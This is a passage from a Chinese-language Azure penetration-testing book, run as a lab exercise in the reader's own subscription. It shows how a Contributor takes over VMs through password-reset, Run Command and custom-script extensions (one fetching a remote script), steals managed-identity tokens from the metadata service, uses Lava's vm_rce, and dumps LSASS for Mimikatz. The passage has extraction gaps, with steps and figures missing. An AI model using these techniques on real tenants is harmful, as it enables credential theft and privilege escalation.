  \n图 4.55 – 运行清理脚本的结果\n\n\n\n\n\n恭喜！您已完成本章中的所有练习场景，并成功删除了在订阅中设置的资源。\n\n### 摘要\n\n\
  在本章中，我们了解了权限较低的读者（Reader）角色可以通过多种方式枚举订阅中的敏感信息。作为渗透测试人员，我们需要为各种情况做好准备，因此在这种受限角色下拥有一些权限提升选项非常有用。\n\
  \n在下一章中，我们将介绍攻击者如何利用 Azure IaaS 服务，以订阅参与者（Contributor）的身份在租户中提升权限。本章将重点介绍在虚拟机上执行命令的多种方式，以及如何通过基础结构服务进行横向移动。\n\
  \n### 延伸阅读\n\n有关 PowerZure 函数的更多文档，请参阅以下链接：\n\n- 信息收集函数：`https://powerzure.readthedocs.io/en/latest/functions/infogathering.html`\n\
  - 操作函数：`https://powerzure.readthedocs.io/en/latest/functions/operational.html`\n\
  \n以下是我们将要介绍的主要内容：\n\n- 查看参与者（Contributor）RBAC 角色\n- 理解参与者的 IaaS 权限提升目标\n- 利用拥有参与者权限的\
  \ Azure 平台功能\n- 从 Azure VM 中提取数据\n\n### 技术要求\n\n在本章中，我们将使用以下工具：\n\n- PowerZure：`https://github.com/haussec/PowerZure`\n\
  - MicroBurst：`https://github.com/NetSPI/MicroBurst`\n- Lava：`https://github.com/mattrotlevi/lava`\n\
  \nMicroBurst 和 PowerZure 应该已经在前面的章节中安装在您的渗透测试**虚拟机（VM）**上，但 Lava 将是本章新增的工具。本章的所有示例都可以使用我们在*第\
  \ 2 章“构建您自己的环境”*中创建的渗透测试虚拟机，或者使用配置相当的 Windows 桌面来执行。\n\n### 查看参与者（Contributor）RBAC\
  \ 角色\n\n正如我们在本书第一章中简要提到的，内置的参与者（Contributor）RBAC 角色授予完全访问权限来管理*分配范围内的所有资源*（管理组、订阅或资源组），但限制其向其他用户或身份分配权限。\n\
  \n鉴于该角色的访问级别，我们的重点不仅在于使用权限，还在于如何利用这些权限来利用用户的错误配置，以达到提升权限和横向移动的目的。我们将通过利用 Azure 平台功能来实现这一点，这些功能可用于在\
  \ IaaS 工作负载（如 VM 和**虚拟机规模集（VMSS）**）上运行操作系统级命令/脚本。\n\n**重要说明**\n\n对于那些在本地 Windows\
  \ 环境中更有经验的人来说，参与者访问权限类似于在大多数系统上拥有一个具有本地管理员权限的域帐户。您有权管理基础结构并进行更改，但无权向域中添加新用户或在域管理员级别进行全局更改。\n\
  \n以下是参与者角色有权使用且我们可以利用的一些 IaaS 平台功能：\n\n- 重置 VM 上的本地用户密码\n- 以特权用户身份在 VM 上运行命令\n-\
  \ 安装和执行 VM 扩展\n- 导出未加密的操作系统磁盘以供分析\n\n请注意，这些操作可能会对环境造成明显的状态更改，如果操作不当，可能会对 IaaS 资源造成问题。请谨慎使用这些功能进行攻击。我们将在本章后面的章节中介绍这些功能，但首先，让我们逐步完成设置\
  \ Azure 订阅的过程，以便进行本章即将进行的练习。\n\n### 动手练习 – 为参与者（IaaS）漏洞利用场景做准备\n\n本动手练习将为我们完成本章剩余练习做好准备。为了跟随本章将要介绍的场景，您需要在自己的\
  \ Azure 订阅中设置一个具有参与者权限的用户以及一些易受攻击的工作负载配置。我们已经使用一个 PowerShell 脚本自动化了此过程，您可以从 Azure\
  \ Cloud Shell 运行该脚本。\n\n以下是我们在本练习中要完成的任务：\n\n1. 打开 Web 浏览器，浏览到 Azure 门户，网址为 https://portal.azure.com。使用\
  \ azureadmin 凭据登录。\n2. 在 Azure 门户中，点击 Azure 门户右上角的 Cloud Shell 图标。选择 PowerShell：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_189_0.png)\n\n图 5.1 – 点击图标打开 Cloud Shell\n\
  \n#### 脚本有什么作用？\n\n该脚本在 Azure 订阅中创建一个具有参与者权限的用户帐户。该脚本还会设置图 5.4 中显示的资源与对象：\n\n- 一台已启动的\
  \ Windows VM，名为 `winvm01`\n- 一台已关闭的 Windows VM，名为 `winvm02`\n- 一台已启动的 Linux VM，名为\
  \ `linuxvm01`\n\n以下是将添加到您的测试订阅中的资源示意图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_191_0.png)\n\
  \n*图 5.4 – 参与者 IaaS 漏洞利用场景*\n\n5. 脚本完成后，您将在输出部分看到后续练习所需的关键信息。请将这些信息复制到记事本文档中，以便日后参考。\n\
  \n您需要从输出部分获取两个关键值：\n\n**Azure 参与者用户：** 这是具有 Azure 订阅参与者权限的 Azure 管理员用户名。\n\n**Azure\
  \ 参与者用户密码：** 这是 Azure 参与者管理员的密码：\n\n```\nTranscript started, output file is contributor-iaas-scenario-output.txt\n\
  ################\n#### Script Output ####\n################\nAzure Contributor Admin\
  \ User: contributoruser@azurepentesting.com\nAzure Contributor Admin User Password:\
  \ myPassword123\n\nTranscript stopped, output file is /home/azureadmin/contributor-iaas-scenario-output.txt\n\
  Deployment Ended 02/23/2021 18:44:44\n```\n\n图 5.5 – 脚本输出示例\n\n您已成功创建了将在本章后续练习中使用的资源。在下一节中，我们将介绍通过利用\
  \ IaaS 参与者级别可用的平台功能来试图实现的目标。\n\n### 理解参与者的 IaaS 权限提升目标\n\n作为*参与者*，我们最终希望将权限提升到订阅的所有者（Owner）角色，和/或\
  \ Azure AD 租户中的特权角色。有了这个角色，我们比读者（Reader）角色在尝试提升环境权限方面拥有更多的选择。为此，我们希望利用对 IaaS 资源的权限，从这些资源中获取更高级别的凭据。由于我们可以控制\
  \ IaaS 资源的几乎每个方面，因此我们可以开始更深入地研究这些资源。\n\n> **重要说明**\n>\n> 虽然本章中描述的场景假设您对 IaaS 资源拥有参与者访问权限，但在\
  \ Azure 渗透测试中情况并非总是如此。您可能拥有允许在 VM 上执行命令的本地或域凭据，但实际无法访问订阅。我们将在本章中介绍的技术可以轻松调整，以便从您具有命令执行权限的\
  \ VM 切入 Azure 订阅。\n\n在我们开始在 Azure VM 上随机执行命令之前，我们需要理解为什么要运行这些命令。假设我们拥有订阅中所有 VM 的参与者权限，为什么还要关心运行额外的命令？\n\
  \n简单的答案是“查找可用于提升权限的凭据”，但可能导致权限提升的凭据有多种选择。我们试图强调在攻击 Azure VM 时我们可能会采用四个主要目标：\n\n\
  - 本地凭据搜寻\n- 域凭据搜寻\n- 网络横向移动机会\n- 租户凭据搜寻\n\n在接下来的几个部分中，我们将详细介绍这四个目标。\n\n### 本地凭据搜寻\n\
  \n能够以特权用户身份在 Azure VM 上运行命令，为收集本地凭据（哈希或明文）提供了绝佳机会，这些凭据可能是*横向移至租户中的其他系统、帐户和订阅*，甚至连接到*本地系统*的关键。管理员经常在不同的环境中的多个系统上重复使用相同的本地凭据，并且也将相同的凭据用于域帐户，这是非常常见的。这种攻击可以同时应用于\
  \ Windows 和 Linux 系统，它们甚至可能在不同操作系统之间共享凭据。\n\n### 域凭据搜寻\n\nAzure VM 可以是独立系统，也可以加入更大的\
  \ **Active Directory（AD）** 域。如果 VM 已加入域，则从 VM 收集信息可能会产生更大的影响。通常，在订阅中具有特权角色的 Azure\
  \ AD 用户也是登录到 VM 的同一批用户。\n\n通过从每个 VM 收集凭据，我们可能能够获取更多特权用户的明文凭据（或哈希）。需要注意的是，此时的域凭据可以是明文、哈希或缓存凭据。哈希或缓存的凭据可能被破解以揭示明文密码。\n\
  \n收集域凭据可能是我们逐步获得域或企业管理员权限的重要一步。到那时，我们将能够转储域的所有密码哈希，或者重置我们想要访问的特权帐户的密码。\n\n\n\n\n\
  \n### 横向网络移动机会\n\n由于 VM 部署在 Azure 中由客户管理的虚拟网络内，组织通常会在其传统网络与 Azure 虚拟网络之间建立连接。能够在\
  \ Azure VM 上运行命令，使我们有机会发现可能与这些 VM 相连的网络中的服务和资源，并寻找利用它们的机会。\n\n运行命令的能力也可能提供绕过防御的机会。在某些情况下，对本地\
  \ Azure 访问和远程 Azure 访问可能有着不同的**多因素身份验证（MFA）**要求。作者曾见过一些环境，要求来自互联网的连接执行 MFA，但不要求来自受信任的内部本地\
  \ IP 的连接执行 MFA。\n\n在本地环境中提升权限，并转储和破解租户管理员账户的凭据后，可能可以直接从本地系统或 Azure VM 登录 Azure 管理界面。\n\
  \n#### 租户凭据搜寻\n\n在某些情况下，组织会在 Azure 中托管特权访问工作站或跳板机。这些系统可供管理员对其环境执行特权操作。我们会尝试从这些机器上收集缓存的访问令牌或其他凭据，以便再次使用。\n\
  \n在本章后面，我们将介绍如何识别 Azure VM 上的托管标识。这些标识也可通过从元数据服务生成令牌，用于从 VM 提升权限进入 Azure 租户。生成的令牌随后可用于从你可能原本无法访问的其他服务收集敏感信息。\n\
  \n现在我们已经了解了目标，接下来看看实现这些目标的不同利用场景。\n\n#### 利用参与者权限调用 Azure 平台功能\n\n借助参与者角色，我们拥有一组丰富的平台级功能，可用于管理环境中的\
  \ VM。由于我们将这些功能用作渗透测试者，因此我们对这些功能的用例可能与普通用户略有不同。\n\n#### 利用密码重置功能\n\nAzure VM 的密码重置功能旨在简化使用安装在每个\
  \ Azure VM 上的 VM 代理重置本地 Azure VM 用户密码的过程。然而，此功能可能被滥用，在 Azure 中的 Windows 和 Linux\
  \ VM 上创建具有管理权限的新本地用户！\n\n此功能可从 Azure 门户（图 5.6）或 Azure 命令行工具中使用。Lava 等利用工具也可利用此功能大规模重置\
  \ VM 密码。渗透测试者可以使用此功能从 Azure 平台横向移动到 IaaS 工作负载，从而推进攻击链：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_195_0.png)\n\
  \n图 5.6 – 门户中 VM 的密码重置示例\n\n要使用 Azure CLI 通过此功能为 VM 创建本地用户，我们将使用以下命令：\n\n```bash\n\
  az vm user update -u username -p password -n <VM_Name> -g <Resource_Group>\n```\n\
  \n要使用 Azure PowerShell 通过此功能为 VM 创建本地用户，我们可以使用以下命令：\n\n```powershell\nSet-AzVMAccessExtension\
  \ -ResourceGroupName \"<Resource_Group>\" -Location \"<Location>\" -VMName \"<VM_Name>\"\
  \ -Name \"<Extension_Name>\" -TypeHandlerVersion \"2.4\" -UserName \"<Username>\"\
  \ -Password \"<Password>\"\n```\n\n你现在已使用参与者凭据完成身份验证。\n\n4. 使用以下命令获取订阅中的 VM 列表：\n\
  \n```\nGet-AzVM\n```\n\n以下是命令输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_197_0.png)\n\
  \n图 5.9 – 可用 VM 列表\n\n5. 使用以下命令在 winvm01 VM 上创建新的本地用户：\n\n```\nSet-AzVMAccessExtension\
  \ -ResourceGroupName \"PENTEST-RG\" -VMName \"winvm01\" -Credential (get-credential)\
  \ -typeHandlerVersion \"2.0\" -Name VMAccessAgent\n```\n\n出现提示时，输入 pentestuser 作为用户名，输入\
  \ secretPass123 作为密码，然后点击“确定”。\n\n以下是此过程的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_197_1.png)\n\
  \n图 5.10 – 密码重置功能示例\n\n6. 使用以下命令获取 `winvm01` 的公网 IP：\n\n```\nGet-AzPublicIpAddress\
  \ -Name winvm01* | Select IpAddress\n```\n\n请记住，如果 VM 没有公网 IP 或未打开 RDP 端口，你始终可以使用参与者角色权限在公网\
  \ IP 上公开该服务。在大多数环境中，这是一项重大状态变更并会增加风险，因此不建议在大多数环境中使用。\n\n以下是命令的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_198_0.png)\n\
  \n图 5.11 – 列出 VM 的公网 IP\n\n7. 通过 RDP 连接到公网 IP，并使用用户名 `pentestuser` 和密码 `secretPass123`\
  \ 进行身份验证。\n\n恭喜！你已成功使用参与者角色在 VM 上创建了本地管理员用户。\n\n这是一个非常方便的功能，但在评估过程中，它并不总是最合适的工具。假设我们希望在测试期间采取更隐蔽一些的行动。在系统上创建新的本地管理员用户可能会触发一些警报。作为一种替代方案，我们可以使用\
  \ Azure 原生功能直接在 VM 上运行命令，而无需额外的账户。\n\n#### 利用运行命令功能\n\nAzure VM 的运行命令功能是一种平台功能，可使用\
  \ VM 代理在 VM 上远程运行脚本。它可用于在 Windows VM 上运行 PowerShell 脚本，在 Linux VM 上运行 shell 脚本。管理员或开发人员通常使用它来快速诊断和修复\
  \ VM 访问与网络问题，使 VM 恢复正常状态。\n\n利用此功能时，需要记住以下信息：\n\n- 脚本在 Windows VM 上以系统账户身份运行，在 Linux\
  \ VM 上以提升的用户（通常为 root）身份运行。\n- 此功能一次只能运行一个脚本。\n- 不支持提示用户信息的交互式脚本。\n- 需要从 VM 到 Azure\
  \ 公共 IP 地址（端口 443）的出站连接才能返回脚本结果。\n\n开始使用运行命令功能的最简单方法是从门户中的 **虚拟机** 边栏选项卡（*图 5.12*）开始。门户中有些预构建命令可以运行，但对于我们的用例，我们需要运行自己的自定义命令：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_199_0.png)\n\n图 5.12 – Azure 运行命令菜单\n\
  \n通过选择 **RunPowerShellScript**（对于 Linux，则为 **RunShellScript**），我们可以在 VM 上运行自己的自定义命令。作为概念验证，我们将展示运行\
  \ whoami 命令：\n\n图 5.13 – Azure 运行命令执行“whoami”\n\n虽然这可能是在 VM 上运行命令的最简便方法之一，但它的可扩展性不强，并且门户在及时将命令执行结果返回给浏览器方面容易出现问题。这可能导致命令结果被截断，以及命令尚未执行完毕就发生会话超时。例如，之前发出的简单\
  \ whoami 命令花费了 21 秒才将输出返回给浏览器。虽然对这样一个简单命令来说，这时间相当长，但更复杂、处理密集的命令可能需要更长的时间（几分钟）才能返回。\n\
  \n##### 从 Az PowerShell 模块运行命令\n\n要获得更可扩展的命令执行选项，我们可以使用 Azure PowerShell 模块，通过 PowerShell\
  \ 管道的威力在多个 VM 上排队命令。在已经过 Azure 身份验证的 PowerShell 会话中，可以使用以下命令列出正在运行的 Windows VM，并将它们赋给\
  \ VMs 变量：\n\n```powershell\nPS C:\\> $VMs = Get-AzVM -Status | where {($_.PowerState\
  \ -EQ \"VM running\") -and ($_.StorageProfile.OSDisk.OSType -eq \"Windows\")}\n\n\
  PS C:\\> $VMs | select ResourceGroupName,Name\nResourceGroupName      Name\n-----------------\
  \      ----\nDEFAULT                RunCommandTestVM\n```\n\n在前面的示例中，我们知道系统运行的是\
  \ Windows，因此我们将把一个 PowerShell ps1 文件传递给主机。我们首先需要将 whoami 命令输入到 ps1 文件中：\n\n```powershell\n\
  PS C:\\> echo \"whoami\" > whoami.ps1\n```\n\n要执行命令，我们需要传入资源组以及我们要在其上运行命令的 VM 的名称。借助\
  \ PowerShell 管道的威力，我们可以将 VMs 变量与本地脚本一起传递给 Invoke-AzVMRunCommand 函数：\n\n```powershell\n\
  PS C:\\> $VMs | Invoke-AzVMRunCommand -CommandId 'RunPowerShellScript' -ScriptPath\
  \ .\\whoami.ps1\n\nValue[0]        :\n    Code        : ComponentStatus/StdOut/succeeded\n\
  \    Level       : Info\n    DisplayStatus : Provisioning succeeded\n    Message\
  \     : nt authority\\system\nValue[1]        :\n    Code        : ComponentStatus/StdErr/succeeded\n\
  ```\n\n\n\n| 级别 | 信息 |\n|---|---|\n| DisplayStatus | 预配成功 |\n| Message |  |\n| Status\
  \ | 成功 |\n| Capacity | 0 |\n| Count | 0 |\n\n虽然这种方法在我们的示例环境中没问题，但它会尝试对订阅中的所有 VM\
  \ 运行你的 PowerShell 脚本。在正常的 Azure 渗透测试期间，你可能希望将命令执行集中在单个 VM 上。\n\n这可以通过指定单个 VM 和资源组，或使用我们之前创建的\
  \ VM 变量的索引来实现。请记住，在 PowerShell 中索引从 0 开始，因此我们可以将 `$VMs[0]` 传递给同一个 `Invoke-AzRunCommand`\
  \ 函数，以对列表中的第一台 VM 运行命令。\n\n##### 从 Azure REST API 运行命令\n\n这可能是在 VM 上运行命令最困难的方式，但幸运的是，有一些脚本可以帮助我们简化此过程。虽然这有点偏离我们标准的已认证\
  \ Contributor 用户流程，但我们可能会遇到这样的情况：我们拥有某个托管标识的令牌，并且该标识具有 Contributor 角色。\n\n如前一章所述，如果我们能访问具有托管标识的\
  \ VM，就可以为该标识生成一个访问令牌，该令牌可用于管理 API。然后，可以将此令牌与 MicroBurst 中的脚本结合使用，以在其他 VM 上运行命令。\n\
  \n下面是一个示例命令，用于获取可访问 Azure 管理 API 端点的访问令牌：\n\n```bash\nroot@LinuxVM:~# curl -H Metadata:true\
  \ -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'\
  \ | jq\n```\n\n以下是命令及其输出的截图：\n\n```text\nroot@LinuxVM:~#\nroot@LinuxVM:~# curl -H\
  \ Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'\
  \ | jq\n{\n  \"access_token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIn...\"\n}\n\
  ```\n\n图 5.14 – 使用 curl 查询元数据服务\n\n获取令牌后，可以利用 MicroBurst 工具包中 REST 部分的 `Invoke-AzVMCommandREST`\
  \ 命令，使用所获取的令牌来运行命令。该函数会提示你选择订阅以及要在其上运行命令的 VM。由于该命令通过 REST API 运行，因此我们无法看到命令的结果。要查看命令的直接结果，我们需要强制\
  \ VM 回调我们，或者创建一些证据来证明我们在该机器上运行了命令（例如 `whoami > test.txt`）。下面是一个使用此方法的示例：\n\n```powershell\n\
  PS C:\\> $mgmtToken = \"TOKEN GOES HERE\"\nPS C:\\> Invoke-AzVMCommandREST -commandToExecute\
  \ \"whoami > test.txt\" -managementToken $mgmtToken\n204cce89-27de-4669-a48b-04c27255e05e\n\
  Executing command on target VM: RunCommandTestVM\n```\n\n运行此命令后，我们可以前往该 VM，在 VM\
  \ 上查找 `test.txt` 文件，以证明命令已经执行。在典型的测试中，我们更有可能使用这种命令执行方式来启动来自 VM 的反向 shell 连接。\n\n\
  从实际渗透测试的角度来看，这种命令执行方式可能是最有用的方法之一。随着越来越多的组织将其传统应用程序迁移到云端，将会有更多机会利用应用程序服务器并从 VM 和\
  \ App Service 主机收集访问令牌。\n\n### Lava 简介\n\nLava 是一个基于 Python 的 Microsoft Azure 利用框架。它内置了多个可用于利用\
  \ Azure 中各种错误配置的模块。本书的作者之一定期为该项目做贡献。在下一个动手练习中，我们将使用它来利用具有特权的 VM 进行角色提升。\n\n**Lava\
  \ 信息**\n\n- **作者**：Matt Rotlevi（Twitter：@mattrotlevi）\n- **开源或商业**：开源项目\n- **GitHub\
  \ 仓库**：https://github.com/mattrotlevi/lava\n- **语言**：Python\n\n#### 动手练习 – 使用 Lava\
  \ 利用特权 VM 资源\n\n在本练习中，我们将在渗透测试 VM 的 WSL 中下载 Lava，使用它查找 Azure 订阅中具有特权的 IaaS 资源，然后将权限从\
  \ Contributor 角色提升为 Owner 角色。\n\n以下是我们将在本练习中完成的任务：\n\n- 使用 WSL 中的 Azure CLI 工具进行\
  \ Azure 身份验证。\n- 在 WSL 中下载 Lava。\n- 使用 Lava 模块获取订阅中特权 VM 的列表。\n- 使用 Lava 模块利用具有\
  \ Owner 角色分配的 VM。\n\n让我们开始吧！\n\n1. 在渗透测试 VM 上打开 PowerShell。\n\n2. 在 PowerShell 控制台中，输入\
  \ `bash` 切换到 Windows Subsystem for Linux（WSL）。\n\n3. 使用以下命令切换到 root 用户。这执行我们想要执行的安装任务时需要。在提示时输入管理员密码：\n\
  \n```text\nazureuser@PentestVM:~# sudo su -\n```\n\n4. 使用 `az login` Azure CLI 命令进行\
  \ Azure 身份验证：\n\n```text\nroot@PentestVM:~# az login\n```\n\n5. 在提示时，输入你在本章第一个练习的脚本输出中获得的\
  \ Contributor 凭据：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_205_0.png)\n\n图 5.15\
  \ – az login 密码提示\n\n你现在已使用 Contributor 凭据完成身份验证。\n\n6. 使用以下命令下载 Lava：\n\n```bash\n\
  root@PentestVM:~# git clone https://github.com/mattrotlevi/lava.git\n```\n\n以下是命令及其输出的截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_205_1.png)\n\n图 5.16 – 克隆 Lava GitHub\
  \ 仓库\n\n7. 使用以下命令切换到 Lava 目录并运行它：\n\n```bash\nroot@PentestVM:~# cd lava/\nroot@PentestVM:~#\
  \ python3 lava.py\n```\n\n看起来如下：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_206_0.png)\n\
  \n图 5.17 – Lava 初始化截图\n\n8. 在 Lava 控制台中，使用 `whoami` 命令确认已认证用户：\n\n```text\nLava\
  \ $> whoami\n```\n\n以下是命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_206_1.png)\n\
  \n图 5.18 – Lava whoami 命令的结果\n\n9. 使用以下命令列出 Lava 中的所有模块：\n\n```text\nLava $> ls\n\
  ```\n\n看起来如下：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_207_0.png)\n\n图 5.19 –\
  \ Lava ls 命令的结果\n\nLava 有许多模块，可以在不同场景下利用资源，但在本章中，我们将使用两个主要模块：`vm_list_privileged`\
  \ 和 `vm_rce`。\n\n10. 使用 `vm_list_privileged` 模块检查订阅中是否有任何 VM 与特权托管标识关联。要在 Lava 中执行模块，命令前需要加上\
  \ `exec` 关键字：\n\n```text\nexec vm_list_privileged\n```\n\n以下是命令及其输出的截图。从截图中可以看到，该模块找到了一台\
  \ VM，但该 VM 没有关联的托管标识（1）。你还可以看到，该模块找到了另一台与特权托管标识关联的 VM（2）。该模块还显示了分配给 VM 的角色以及角色分配范围（3）：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_208_0.png)\n\n图 5.20 – Lava vm_list_privileged\
  \ 模块输出\n\n总的来说，该模块应列出两台具有特权角色分配的 VM（假设你已删除了上一章的 VM）：一台在订阅范围内具有 Owner 角色分配的 Linux\
  \ VM，以及一台具有 Contributor 角色分配的 Windows VM。请注意被发现具有 Owner 权限的 Linux VM 的名称（linuxvm01）和资源组（pentest-rg）。由于我们已经拥有分配了\
  \ Contributor 角色的凭据，因此我们将专注于利用具有 Owner 角色分配的 VM 来获取其令牌，以实现权限提升。\n\n11. 使用 `vm_rce`\
  \ 模块以 Contributor 身份利用 Run Command 功能。你需要指定 VM 名称和资源组，如下所示：\n\n```text\nLava $>\
  \ exec vm_rce -rgrp PENTEST-RG -vm_name linuxvm01\n```\n\n\n以下是命令及其输出的截图。现在你应该会看到一个显示界面，看起来像是获得了分配有“所有者”角色的\
  \ Linux VM 的 shell 访问权限。我们可以选择在该 VM 内部以所有者身份运行命令，也可以获取一个可在 VM 外部复用的访问令牌。本例中，我们选择后一种方案。值得注意的是，这并不是一个真正的\
  \ shell；在后台，Lava 会获取命令输入，使用“运行命令”（Run Command）功能执行命令，并返回输出！\n\n```\nLava $> exec\
  \ vm_rce -rgrp PENTEST-RG -vm_name linuxvm01\n[+] getting shell info [+]\nalright!\
  \ here's a nice shell!\nazureuser@linuxvm01$ _\n```\n\n图 5.21 – 在 Lava 中执行 exec\
  \ vm_rce 模块的结果\n\n- 12. 在 shell 中，运行以下命令以获取资源管理器的访问令牌。这将获得一个可用于以所有者权限进行 API 调用的访问令牌：\n\
  \n```\nazureuser@linuxvm01$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com'\
  \ -H Metadata:true\n```\n\n以下是命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_209_0.png)\n\
  \n图 5.22 – 元数据令牌请求的结果\n\n以下是命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_211_0.png)\n\
  \n图 5.24 – 退出 shell 和 Lava 并设置令牌的结果\n\n- 15. 使用该令牌，以所有者权限对资源管理器运行命令。要安装 jq，请执行 `apt\
  \ install jq` 命令。你可以尝试以下命令，但我们只展示第一个命令的截图。为了方便，这些命令已包含在此 URL 的文件中：`http://bit.ly/tokenexploit`。欢迎下载：\n\
  \n```\n##### Get a list of subscriptions\ncurl --header \"Authorization: Bearer\
  \ ${TOKEN}\" https://management.azure.com/subscriptions?api-version=2020-01-01 |\
  \ jq\n\n##### Store the subscription ID in a variable\nSUB_ID=$(curl --header \"\
  Authorization: Bearer ${TOKEN}\" https://management.azure.com/subscriptions?api-version=2020-01-01\
  \ | jq -r .value[].subscriptionId)\n\n##### Get a list of resource groups\ncurl\
  \ --header \"Authorization: Bearer ${TOKEN}\" https://management.azure.com/subscriptions/${SUB_ID}/resourcegroups?api-version=2019-10-01\
  \ | jq\n\n##### Get a list of resources\ncurl --header \"Authorization: Bearer ${TOKEN}\"\
  \ https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2019-10-01\
  \ | jq\n```\n\n以下是第一个命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_212_0.png)\n\
  \n图 5.25 – 可用订阅的示例列表\n\n恭喜！你已成功实现了从参与者（Contributor）角色到所有者（Owner）角色的权限提升。\n\n###\
  \ 执行 VM 扩展\n\n作为本节的最后一点，我们想介绍使用 VM 扩展在 VM 上运行命令。虽然这不是运行命令的最简单方式，但在某些情况下，它可能是你唯一的选择。\n\
  \nAzure VM 扩展是管理员在 VM 部署后用于配置 VM 的工具。为了针对不同用途定制这些扩展，Microsoft 允许基于其定义的架构创建自定义脚本扩展。\n\
  \n该架构包含指向脚本文件的文件 URI 或 URL，使我们可以指定要执行的 PowerShell 文件。作为攻击者，我们将需要一个 Web 服务器来托管这些文件\
  \ URI。我们建议使用 Azure Blob Storage 内置的 Web 托管功能，或使用 Azure App Service 来托管这些文件。\n\n\
  运行自定义脚本扩展的命令由以下参数组成：\n\n- **ResourceGroupName**：VM 的资源组。\n- **VMName**：VM 的名称。\n\
  - **Location**：VM 所在的区域。\n- **FileUri**：脚本文件的 HTTP/HTTPS URL。\n- **Run**：要运行的文件；应与\
  \ ps1 文件名相同。\n- **Name**：自定义脚本扩展将使用的名称。\n\n```\nPS C:\\> Set-AzVMCustomScriptExtension\
  \ -ResourceGroupName TEST -VMName PentestVM -Location westcentralus -FileUri 'http://book.azurepentesting.com/whoami.ps1'\
  \ -Run 'whoami.ps1' -Name CustomScriptExtension\n```\n\n在前面的命令示例中，我们将在 PentestVM\
  \ 主机上运行 whoami.ps1 脚本（托管在 book.azurepentesting.com 上）。在更实际的场景中，我们会使用自定义脚本扩展来创建反向\
  \ shell 或向 VM 添加新用户。\n\n> **重要说明**\n> 本章恰好介绍了本书技术审阅者之一 Jake Karnes 的两项研究成果。我们强烈建议你阅读他关于使用\
  \ Azure VM 扩展在 Azure VM 上启动 Covenant C2 植入体的深入文章：https://blog.netspi.com/attacking-azure-with-custom-script-extensions/。\n\
  \n虽然这是另一种盲命令执行方法，但它可以很方便地在 VM 上获得初步立足点。这种方法也为我们作为订阅参与者可使用的 Azure 功能这部分内容画上了句号。接下来，我们将回顾使用刚刚介绍的方法要从\
  \ VM 中收集的数据。\n\n### 从 Azure VM 中提取数据\n\n现在，我们已经充分了解了作为参与者操作 Azure VM 的众多选项。凭借此访问权限，我们将开始从这些\
  \ VM 中收集敏感信息和凭据，以提升租户中的权限，并可能提升 AD 域中的权限。\n\n以下是我们希望从 VM 中收集的一些常见信息类型：\n\n- Windows\
  \ NTLM 哈希和内存中的凭据\n- 存储在 VM 扩展设置中的凭据\n- 敏感文件和本地管理员密码哈希\n\n我们已经介绍了如何查找托管标识并从其中收集令牌，但它们也是从\
  \ VM 中提取凭据数据的关键目标。\n\n### 使用 Mimikatz 收集本地凭据\n\n虽然 Mimikatz 的所有功能足以写成一本书，但我们只会介绍从\
  \ Windows VM 中提取凭据所需的基础知识。运行 Mimikatz 的最基本方式是在受害机器上运行可执行文件。虽然这种方法可行，但任何还算最新的端点检测与响应（EDR）软件都会在可执行文件写入虚拟磁盘后立即捕获它。\n\
  \n如果面对的是不太成熟的 EDR，我们可以尝试使用 Invoke-Mimikatz PowerShell 脚本在内存中运行它，或者使用其他技术将 Mimikatz\
  \ 直接加载到内存中。对于某些较弱的 EDR 配置，这可能可行，但我们也发现这种方式被检测到的情况也越来越多。\n\n最后，我们可以尝试转储 LSASS 进程内存，并使用\
  \ Mimikatz 离线解析。这样我们永远不必将 Mimikatz 放置在 VM 上，而且也不太可能触发任何警报。许多防御工具现在都在监视 LSASS 进程并保护内存空间不被转储，因此你的实际效果可能会有所不同。\n\
  \n从好的方面来说，遇到几乎没有或完全没有端点保护的开发 VM 并不罕见。这些 VM 可能是绝佳的凭据来源，也可能完全是空的开发机器。无论如何，我们将通过以下步骤介绍最终技术，作为离线运行\
  \ Mimikatz 解析 LSASS 转储的示例：\n\n- 1. 在目标 VM 上，打开任务管理器（按 Ctrl + Shift + Esc 或在“开始”菜单中键入\
  \ taskmgr）。\n- 2. 在“**详细信息**”选项卡下，找到 lsass.exe 进程。\n- 3. 右键单击 lsass 进程，然后选择“**创建转储文件**”：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_215_0.png)\n\n图 5.26 – 创建 LSASS 转储文件\n\
  \n- 4. 转储文件写入完成后，Windows 将告知生成的 .dmp 文件的路径。\n- 5. 导航到该文件夹，将 .dmp 文件从 VM 复制到你的测试系统。\n\
  - 6. 在你的测试系统上，打开一个具有特权的 PowerShell 或 CMD 会话，并从 GitHub 下载 Mimikatz：https://github.com/gentilkiwi/mimikatz。\n\
  - 7. 运行 Mimikatz 可执行文件，并使用 sekurlsa::minidump lsass.dmp 命令将 .dmp 文件加载到 Mimikatz。\n\
  \n\n\n\n作为扩展的执行和日志记录的一部分，它们会在 VM 上存储扩展配置文件和日志。这些文件可以被解析以获取敏感信息，包括凭据。此类别的主要罪魁祸首之一是域加入扩展，它最终可能会存储用于将\
  \ VM 加入域的凭据。\n\n> **重要说明**\n>\n> 注意域加入凭据。它们不仅可能记录在 Run Command 扩展日志中，而且在未正确关闭的 PowerShell\
